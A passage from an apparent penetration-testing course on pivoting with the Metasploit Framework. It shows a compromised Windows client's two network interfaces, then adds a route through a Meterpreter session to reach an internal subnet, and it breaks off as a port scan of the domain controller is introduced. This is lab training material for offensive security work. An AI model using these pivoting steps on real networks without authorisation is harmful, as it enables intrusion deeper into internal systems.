```
meterpreter >
*Listing 803 - Using mimikatz from meterpreter*
```

# 22.5.4 Pivoting with the Metasploit Framework

After compromising a target, we can pivot from that system to additional targets. We can pivot from within the MSF, which is convenient, but lacks the flexibility of manual pivoting techniques.

For example, let's leverage our existing Meterpreter session to enumerate the internal network's Active Directory infrastructure and pivot to other machines.

To begin, we notice that the compromised windows client has two network interfaces.

```
C:\Users>offsec> **ipconfig**
Windows IP Configuration
Ethernet adapter Ethernet1:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . : fe80::49e9:5c50:265f:6600%4
IPv4 Address. . . . . . . . . . . : 192.168.1.111
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.1.1
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.11.0.2
C:\Users>offsec.corp>
*Listing 804 - Dual interfaces on compromised client*
```

We will use **route** and **add** to create a path to the alternate internal network subnet we discovered. We will also specify the session ID that this route will apply to:

```
msf5 > **route add 192.168.1.0/24 11**
[*] Route added
msf5 > **route print**
IPv4 Active Routing Table
==============================
Subnet Netmask Gateway
------ ------ -------
192.168.1.0 255.255.255.0 Session 11
*Listing 805 - Adding a new route*
```

With a path created to the internal network, we can now enumerate this subnet. Since we already know the IP address of the domain controller, we will perform a limited port scan of it using the **portscan/tcp** module.